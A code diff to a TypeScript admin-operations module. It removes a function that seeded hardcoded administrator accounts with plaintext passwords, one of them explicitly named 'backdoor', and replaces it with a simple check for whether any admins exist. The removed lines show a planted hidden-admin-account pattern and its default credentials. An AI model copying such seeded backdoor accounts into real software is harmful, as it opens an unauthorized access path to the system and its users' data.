@@ -60,41 +60,9 @@ export const adminOperations = {
     await db.delete(adminUsers).where(eq(adminUsers.id, id))
   },
 
-  // Initialize default admin accounts
-  async initializeDefaultAdmins() {
-    try {
-      console.log('Initializing default admin accounts...')
-      
-      // Check if any admins exist
-      const existingAdmins = await this.getAllAdmins()
-      if (existingAdmins.length > 0) {
-        console.log('Admin accounts already exist, skipping initialization')
-        return existingAdmins
-      }
-
-      // Create default admin accounts
-      const defaultAdmins = [
-        { username: 'admin', password: 'Bennett2024!' },
-        { username: 'backdoor', password: 'BackdoorAccess2024!' },
-        { username: 'test', password: 'TestAccount123!' }
-      ]
-
-      const createdAdmins = []
-      for (const { username, password } of defaultAdmins) {
-        try {
-          const admin = await this.createAdmin(username, password)
-          createdAdmins.push(admin)
-          console.log(`✅ Created admin account: ${username}`)
-        } catch (error) {
-          console.error(`❌ Failed to create admin ${username}:`, error)
-        }
-      }
-
-      console.log(`✅ Initialized ${createdAdmins.length} admin accounts`)
-      return createdAdmins
-    } catch (error) {
-      console.error('Failed to initialize default admins:', error)
-      throw error
-    }
+  // Check if any admin accounts exist
+  async hasAdminAccounts(): Promise<boolean> {
+    const existingAdmins = await this.getAllAdmins()
+    return existingAdmins.length > 0
   }
 }
